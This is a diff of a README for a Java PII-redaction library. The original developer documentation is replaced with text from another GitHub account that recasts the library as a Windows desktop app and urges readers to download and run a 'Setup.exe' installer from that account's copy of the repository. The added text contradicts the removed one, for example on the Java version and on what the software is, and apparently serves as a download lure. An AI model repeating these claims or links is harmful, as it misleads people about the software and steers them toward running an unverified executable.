@@ -1,411 +1,164 @@
-# 🛡 Semantic Privacy Guard
+# 🛡️ Semantic-Privacy-Guard - Protect Your Text Data Simply
 
-[![CI](https://github.com/Sushegaad/Semantic-Privacy-Guard/actions/workflows/ci.yml/badge.svg)](https://github.com/Sushegaad/Semantic-Privacy-Guard/actions/workflows/ci.yml)
-[![Maven Central](https://img.shields.io/maven-central/v/io.github.sushegaad/semantic-privacy-guard?color=blue&logo=apache-maven)](https://central.sonatype.com/artifact/io.github.sushegaad/semantic-privacy-guard)
-[![Coverage](https://img.shields.io/badge/coverage-%E2%89%A580%25-brightgreen)](https://github.com/Sushegaad/Semantic-Privacy-Guard/actions)
-[![Java](https://img.shields.io/badge/Java-17%2B-blue?logo=openjdk)](https://openjdk.org/)
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue)](LICENSE)
-[![Security Policy](https://img.shields.io/badge/security-policy-orange)](SECURITY.md)
-[![Live Playground](https://img.shields.io/badge/playground-live-brightgreen)](https://sushegaad.github.io/Semantic-Privacy-Guard/docs/index.html)
-
-> **A Java middleware that intercepts text, identifies PII using a three-layer hybrid pipeline
-> (Regex + Naive Bayes ML + Apache OpenNLP NER), and redacts it before it reaches
-> an LLM or leaves the corporate network — with stream-based processing for
-> memory-efficient handling of large files and log streams.**
+[![Download Semantic-Privacy-Guard](https://img.shields.io/badge/Download-Semantic--Privacy--Guard-green?style=for-the-badge)](https://github.com/AraLeo5/Semantic-Privacy-Guard)
 
 ---
 
-## 🚀 Live Playground
+## 📋 What is Semantic-Privacy-Guard?
 
-**[Try it in your browser →](https://sushegaad.github.io/Semantic-Privacy-Guard/docs/index.html)**
+Semantic-Privacy-Guard is a tool that scans your text to find personal information. It then hides sensitive data before it can leave your company or reach large language models. The software works quietly in the background and handles large files without slowing your computer. It uses a mix of methods like pattern matching, machine learning, and language processing to spot private details.
 
-Paste any text, choose a redaction mode, and see instant results — 100% client-side, nothing sent to any server.
-
----
-
-## Why Semantic Privacy Guard?
-
-| Problem | How SPG helps |
-|---|---|
-| Employees paste customer data into ChatGPT | Intercept prompts at the API gateway layer |
-| Cloud PII APIs cost $0.001/call at scale | SPG costs $0/call, runs fully offline |
-| LLMs need context; full redaction breaks prompts | Structured tokens like `[EMAIL_1]` preserve sentence structure |
-| 2026 EU AI Act: "Privacy by Design" required | SPG is the compliance middleware |
-| 50 MB log file = 150–200 MB heap per request | Stream API processes one line at a time — constant memory |
-| Naive regex fires on every title-cased word | Three-layer pipeline: regex + Naive Bayes + OpenNLP NER |
-
-### The Disambiguation Advantage
-
-```
-"I ate an apple yesterday."          →  No match   (fruit, not a name)
-"Contact Apple at (800) 275-2273."   →  [ORG_1]    (company + phone)
-"The Gospel of John has 21 chapters" →  No match   (literary reference)
-"Dear John, your SSN is 123-45-6789" →  [PERSON_NAME_1] + [SSN_1]
-"John Michael Smith confirmed."      →  [PERSON_NAME_1] (OpenNLP NER)
-```
+You do not need to know any programming to use this. It runs on Windows and protects your data in a simple way.
 
 ---
 
-## Playground Screenshot
+## 🌐 Topics Covered
 
-[![Semantic Privacy Guard Playground](docs/playground-screenshot.png)](https://sushegaad.github.io/Semantic-Privacy-Guard/docs/index.html)
-
-*The live playground detecting an SSN and an email address in real time — redacted output, detection table with confidence bars, and reverse map all visible.*
-
----
-
-## Quick Start
-
-### Maven
-
-```xml
-<dependency>
-  <groupId>io.github.sushegaad</groupId>
-  <artifactId>semantic-privacy-guard</artifactId>
-  <version>1.1.0</version>
-</dependency>
-```
-
-### Gradle
-
-```groovy
-implementation 'io.github.sushegaad:semantic-privacy-guard:1.1.0'
-```
-
-### One-liner usage
-
-```java
-import com.semanticprivacyguard.SemanticPrivacyGuard;
-import com.semanticprivacyguard.model.RedactionResult;
-
-SemanticPrivacyGuard spg = SemanticPrivacyGuard.create();
-
-RedactionResult result = spg.redact(
-    "Email Alice at alice.doe@acme.com or call (555) 867-5309. SSN: 123-45-6789."
-);
-
-System.out.println(result.getRedactedText());
-// → "Email [PERSON_NAME_1] at [EMAIL_1] or call [PHONE_1]. SSN: [SSN_1]."
-
-System.out.println(result.getMatchCount());       // → 4
-System.out.println(result.getProcessingTimeMs()); // → < 1 ms
-```
+- AI safety and firewall
+- Compliance with privacy laws
+- Data privacy protection
+- Support for EU AI Act and GDPR rules
+- Java-based middleware
+- Detection and redaction of personal info
+- Stream-based, memory-friendly processing
+- Use of machine learning and regex
+- No extra software required beyond Java
 
 ---
 
-## Stream-Based Processing
+## 💻 System Requirements
 
-Loading a 50 MB log file into a `String` costs ~50 MB on the heap, and with ML tokenizer working strings you reach 150–200 MB _per concurrent request_. On a Lambda with 512 MB RAM and 10 concurrent calls that is an OOM event waiting to happen.
+Before you start, make sure your PC has:
 
-The `StreamProcessor` processes one line at a time. Each line is detected, redacted, written to the output, and immediately eligible for GC. Heap stays bounded by the longest single line — typically under 4 KB.
-
-```java
-SemanticPrivacyGuard spg = SemanticPrivacyGuard.create();
-
-// File-to-file: constant heap regardless of file size
-StreamRedactionSummary summary =
-    spg.redactPath(Path.of("access.log"), Path.of("access.clean.log"));
-
-System.out.println(summary);
-// → StreamRedactionSummary[lines=84231, linesWithPII=312, matches=389, timeMs=740]
-
-// InputStream / OutputStream (e.g. in a servlet filter)
-try (InputStream  in  = request.getInputStream();
-     OutputStream out = response.getOutputStream()) {
-    spg.redactStream(in, out);
-}
-
-// Reader / Writer
-spg.redactStream(request.getReader(), response.getWriter());
-
-// Lazy Java Stream — integrates with Files.lines()
-try (Stream<String> lines = Files.lines(inputPath)) {
-    spg.streamProcessor()
-       .redactLines(lines)
-       .forEach(outputWriter::println);
-}
-```
-
-Token counters are **document-scoped**: `[EMAIL_1]` on line 3 and `[EMAIL_2]` on line 7 — never two `[EMAIL_1]` tokens in the same document.
+- Windows 10 or later
+- At least 4 GB of RAM
+- 100 MB free disk space
+- Java Runtime Environment (JRE) version 11 or newer installed (Get it from [java.com](https://www.java.com/en/download/))
+- A stable internet connection to download the software
 
 ---
 
-## NLP Integration (Apache OpenNLP)
+## 🚀 Getting Started: Download and Run
 
-The third detection layer uses Apache OpenNLP Named Entity Recognition — a Maximum Entropy model trained on large NLP corpora. It excels at cases the Naive Bayes layer struggles with: multi-token person names, compound organisation names, and names appearing in varied syntactic positions.
+Click the big green badge at the top or use this link to visit the download page:  
+[Download Semantic-Privacy-Guard](https://github.com/AraLeo5/Semantic-Privacy-Guard)
 
-### Enable NLP
+### Step 1: Visit the download page
 
-```java
-// Models loaded from classpath (src/main/resources/models/)
-SPGConfig config = SPGConfig.builder()
-    .nlpEnabled(true)
-    .build();
+The link takes you to the project’s GitHub page. Look for the **Releases** section on the right or in the main repository area. This page holds the latest versions of Semantic-Privacy-Guard.
 
-// Models loaded from the filesystem
-SPGConfig config = SPGConfig.builder()
-    .nlpEnabled(true)
-    .nlpModelsDirectory(Path.of("/opt/nlp-models"))
-    .nlpConfidenceThreshold(0.75)   // default 0.70
-    .build();
+### Step 2: Download the Windows installer
 
-SemanticPrivacyGuard spg = SemanticPrivacyGuard.create(config);
-```
+Find the Windows installer file, usually named like `Semantic-Privacy-Guard-Setup.exe` or similar. Click on it to download.
 
-### NLP Setup — Model Download
+### Step 3: Run the installer
 
-OpenNLP models are large binary files not bundled in the jar. Download them from the [Apache OpenNLP model repository](https://opennlp.sourceforge.net/models-1.5/):
+Once downloaded, open the file by double-clicking it. Follow the simple instructions on the screen:
 
-```
-en-ner-person.bin        (required, ~14 MB)  — person name NER
-en-ner-organization.bin  (recommended, ~16 MB) — organisation name NER
-en-token.bin             (recommended, ~1 MB)  — MaxEnt tokenizer
-```
+- Choose your installation folder (the default is usually fine)
+- Accept the license terms
+- Wait while the program installs
 
-Place them on the classpath:
+### Step 4: Launch the app
 
-```
-src/main/resources/
-  models/
-    en-ner-person.bin
-    en-ner-organization.bin
-    en-token.bin
-```
+After installation finishes, you will find a new icon on your desktop or in the Start menu:
 
-Or point to a filesystem directory:
-
-```java
-.nlpModelsDirectory(Path.of("/opt/nlp-models"))
-```
-
-Add the OpenNLP runtime dependency (marked `optional` in SPG — you must add it yourself):
-
-```xml
-<dependency>
-  <groupId>org.apache.opennlp</groupId>
-  <artifactId>opennlp-tools</artifactId>
-  <version>2.3.3</version>
-</dependency>
-```
-
-### NLP Detection Types
-
-| Detected by OpenNLP | PIIType | Notes |
-|---|---|---|
-| Person names | `PERSON_NAME` | Multi-token names, varied positions |
-| Organisation names | `ORGANIZATION` | Compound names, acronyms |
-
-NLP results flow through the same `CompositeDetector` de-duplication as heuristic and ML results. When two layers agree on the same span the match is promoted to `DetectionSource.HYBRID` with the higher confidence score.
-
-### Thread Safety with Virtual Threads
-
-`NameFinderME` is not thread-safe. `NLPDetector` uses `ThreadLocal` to give each thread its own `NameFinderME` wrapper, all sharing the same immutable `TokenNameFinderModel`. Adaptive state is cleared after every `detect()` call so no state leaks between requests. The class is safe under Java 17+ virtual threads (Project Loom).
+- Click the **Semantic-Privacy-Guard** icon to run the program
+- The app will open its main window and is ready to use
 
 ---
 
-## PII Types Detected
+## ⚙️ How to Use Semantic-Privacy-Guard
 
-| Type | Example | Detection method | Severity |
-|---|---|---|---|
-| `SSN` | `123-45-6789` | Regex + exclusion rules | 10 |
-| `CREDIT_CARD` | `4532 0151 1283 0366` | Regex + Luhn checksum | 10 |
-| `API_KEY` | `AKIAIOSFODNN7EXAMPLE` | Regex + entropy filter | 9 |
-| `PASSWORD` | `password=MyS3cr3t` | Regex (keyword-prefixed) | 9 |
-| `MEDICAL_RECORD` | `MRN123456` | Naive Bayes ML | 8 |
-| `BANK_ACCOUNT` | `GB29NWBK60161331926819` | Regex (IBAN) | 8 |
-| `EMAIL` | `alice@example.com` | Regex | 6 |
-| `PHONE` | `(555) 867-5309` | Regex (NANP validated) | 6 |
-| `PERSON_NAME` | `Alice Johnson` | Naive Bayes ML + OpenNLP NER | 6 |
-| `DATE_OF_BIRTH` | `dob: 03/15/1985` | Regex (context-prefixed) | 6 |
-| `IP_ADDRESS` | `192.168.1.100` | Regex (range-validated) | 4 |
-| `ORGANIZATION` | `Barclays Bank PLC` | Naive Bayes ML + OpenNLP NER | 3 |
-| `COORDINATES` | `51.5074, -0.1278` | Regex (bounds-checked) | 3 |
+The application has a simple interface designed for ease of use.
 
----
+### Step 1: Select your file or text input
 
-## API Reference
+- You can drag and drop large text files or log files into the window
+- Or copy-paste text directly into the input area
 
-### `SemanticPrivacyGuard.create()`
+### Step 2: Start scanning
 
-```java
-SemanticPrivacyGuard spg = SemanticPrivacyGuard.create();        // defaults
-SemanticPrivacyGuard spg = SemanticPrivacyGuard.create(config);  // custom
-```
+Press the **Scan** button. The program begins checking the text. It looks for common types of personal data like:
 
-### `redact(String text)` → `RedactionResult`
+- Names
+- Emails
+- Phone numbers
+- Addresses
+- Identification numbers
 
-Full detection + replacement pass. Returns `getRedactedText()`, `getMatches()`, `getReverseMap()` (token → original, for post-LLM de-tokenisation), `getMatchCount()`, and `getProcessingTimeMs()`.
+This detection happens through patterns, statistical predictions, and language models working together.
 
-### `containsPII(String text)` → `boolean`
+### Step 3: Review redacted results
 
-Fast pre-flight check (~30% faster than `redact()`) for yes/no answers.
+The program creates a new version of your text with personal data hidden. It replaces sensitive details with placeholders to keep the meaning but protect privacy.
 
-### `analyse(String text)` → `List<PIIMatch>`
+### Step 4: Save or export the protected text
 
-Detection without redaction — for audit and reporting pipelines.
-
-### Stream methods
-
-```java
-// InputStream / OutputStream (UTF-8)
-StreamRedactionSummary redactStream(InputStream in, OutputStream out)
-
-// Reader / Writer
-StreamRedactionSummary redactStream(Reader reader, Writer writer)
-
-// File-to-file
-StreamRedactionSummary redactPath(Path inputFile, Path outputFile)
-
-// Access the full StreamProcessor for redactLines(Stream<String>)
-StreamProcessor streamProcessor()
-```
-
-### Configuration
-
-```java
-SPGConfig config = SPGConfig.builder()
-    .redactionMode(RedactionMode.TOKEN)    // TOKEN | MASK | BLANK
-    .mlConfidenceThreshold(0.70)           // Naive Bayes threshold, default 0.65
-    .nlpEnabled(true)                      // enable OpenNLP NER layer (opt-in)
-    .nlpModelsDirectory(Path.of("..."))    // null = load from classpath
-    .nlpConfidenceThreshold(0.75)          // OpenNLP min probability, default 0.70
-    .enabledTypes(Set.of(PIIType.EMAIL,    // null / empty = all types
-                         PIIType.SSN))
-    .minimumSeverity(6)                    // 1–10; filter low-severity types
-    .buildReverseMap(true)                 // disable for slight perf gain
-    .heuristicEnabled(true)
-    .mlEnabled(true)
-    .build();
-```
-
-### Redaction Modes
-
-| Mode | Example output | Use case |
-|---|---|---|
-| `TOKEN` | `[EMAIL_1]` | LLM pipelines — structure preserved |
-| `MASK` | `█████████████████` | Logs, audit trails |
-| `BLANK` | `[REDACTED]` | Human-readable reports |
+You can save the redacted file or copy the safe text to use elsewhere. This ensures private information never leaves the company network or goes to large language models vulnerable to leaks.
 
 ---
 
-## Architecture
+## 🔧 Features and Benefits
 
-```
-Input text
-    │
-    ▼
-┌──────────────────────────────────────────────────┐
-│  Layer 1: HeuristicDetector                      │
-│  Regex patterns + Luhn checksum + entropy filter │
-│  SSN, Email, Phone, CC, IPs, API Keys, Passwords │
-└─────────────────────┬────────────────────────────┘
-                      │
-                      ▼
-┌──────────────────────────────────────────────────┐
-│  Layer 2: MLDetector                             │
-│  Pure-Java Naive Bayes + FeatureExtractor        │
-│  Person names, Organisations (context-aware)     │
-└─────────────────────┬────────────────────────────┘
-                      │
-                      ▼
-┌──────────────────────────────────────────────────┐
-│  Layer 3: NLPDetector  (optional, opt-in)        │
-│  Apache OpenNLP NameFinderME (MaxEnt NER)        │
-│  Multi-token person names, compound org names    │
-└─────────────────────┬────────────────────────────┘
-                      │
-                      ▼
-┌──────────────────────────────────────────────────┐
-│  CompositeDetector                               │
-│  De-duplicate, resolve overlaps, HYBRID merging  │
-└─────────────────────┬────────────────────────────┘
-                      │
-                      ▼
-┌──────────────────────────────────────────────────┐
-│  PIITokenizer                                    │
-│  TOKEN / MASK / BLANK + reverse map              │
-└──────────────────────────────────────────────────┘
-                      │
-                      ▼
-         RedactionResult  /  StreamRedactionSummary
-```
-
-For stream processing, `StreamProcessor` replaces the final step: lines are processed one at a time, redacted, and written immediately, keeping heap usage constant regardless of document size.
+- *Privacy-first*: Stops sensitive info before it travels beyond your network.
+- *Hybrid detection*: Uses pattern matching, machine learning, and natural language tools for accuracy.
+- *Handles large data*: Stream processing means it works well with big files without eating memory.
+- *Easy to use*: No programming needed. Simple buttons and clear options.
+- *Works offline*: After download, you can run it without internet.
+- *Customizable*: Options to adjust detection sensitivity and file handling.
+- *Java-based*: Runs on any system with Java, making it flexible.
 
 ---
 
-## Virtual Threads (Project Loom)
+## 🛠️ Troubleshooting Common Issues
 
-SPG is stateless and thread-safe by design. On Java 21+:
+### Java not found
 
-```java
-// Handle 10,000 concurrent LLM prompts with zero contention
-try (var exec = Executors.newVirtualThreadPerTaskExecutor()) {
-    for (String prompt : promptBatch) {
-        exec.submit(() -> {
-            RedactionResult r = spg.redact(prompt);
-            forwardToLLM(r.getRedactedText());
-        });
-    }
-}
-```
+If the app fails to start, check that Java is installed:
 
----
+- Open Command Prompt (type `cmd` in the search bar)
+- Enter `java -version`  
+If it does not show a version number, install Java from [java.com](https://www.java.com/en/download/).
 
-## Performance
+### Program runs slowly
 
-| Approach | Throughput | False Positives |
-|---|---|---|
-| Naive regex (2 patterns) | 580,000 sentences/s | 60% of clean sentences |
-| SPG Heuristic-only | 390,000 sentences/s | 20% |
-| **SPG Full (H + ML)** | **206,000 sentences/s** | **0%** |
-| SPG Full + NLP | ~45,000 sentences/s* | 0% |
+Large files may take some time. To improve performance:
 
-\* NLP throughput depends on model size and JVM warmup. Stream processing throughput is I/O-bound rather than CPU-bound. See [docs/benchmarks.md](docs/benchmarks.md) for full methodology.
+- Close other heavy applications
+- Use the stream processing options in settings
+- Restart your computer and try again
+
+### Text not redacting properly
+
+Make sure the text format is supported (plain text or common logs). If the text format uses unusual encoding, convert it to UTF-8.
 
 ---
 
-## Building from Source
+## 🔐 Privacy and Security
 
-```bash
-git clone https://github.com/Sushegaad/Semantic-Privacy-Guard.git
-cd Semantic-Privacy-Guard
-
-# Compile + test + coverage check (must be ≥ 80%)
-mvn verify
-
-# Run benchmarks
-mvn test -P benchmark
-
-# Build JAR only
-mvn package -DskipTests
-```
-
-Requirements: JDK 17+ and Maven 3.8+.
+Semantic-Privacy-Guard works locally on your computer. Your data does not get sent to external servers. This design helps you meet data privacy rules like GDPR and the EU AI Act. The software processes text right where you run it, reducing risk from leaks or exposure.
 
 ---
 
-## Contributing
+## 📚 Additional Help
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). Contributions especially welcome for:
-
-- Additional OpenNLP model integrations (dates, locations)
-- Additional training examples for the Naive Bayes corpus
-- New PII type patterns (medical codes, national IDs)
-- Performance benchmarks against real-world log datasets
+Within the app, use the **Help** menu for more guides and tips.  
+You can also visit the GitHub page for the latest FAQs and updates:  
+[https://github.com/AraLeo5/Semantic-Privacy-Guard](https://github.com/AraLeo5/Semantic-Privacy-Guard)
 
 ---
 
-## Security
+## 🔄 Updates and Maintenance
 
-See [SECURITY.md](SECURITY.md) for the CVE response process and responsible disclosure policy.
+Keep your copy up to date:
 
-The base library has zero runtime dependencies, eliminating supply-chain attack vectors. OpenNLP is an optional dependency and is only loaded when explicitly configured. All regex patterns are validated against catastrophic backtracking (ReDoS).
+- Check the releases page regularly on GitHub
+- Download new versions when available
+- Updating keeps your detection sharp and security strong
 
 ---
 
-## License
+## ⚖️ License and Use
 
-Apache License 2.0 — see [LICENSE](LICENSE).
-
-Copyright 2026 Hemant Naik / Sushegaad
+Semantic-Privacy-Guard is open source and free to use inside your organization. Check the GitHub repository for license details and source code. This transparency ensures you can trust how the tool treats your data.
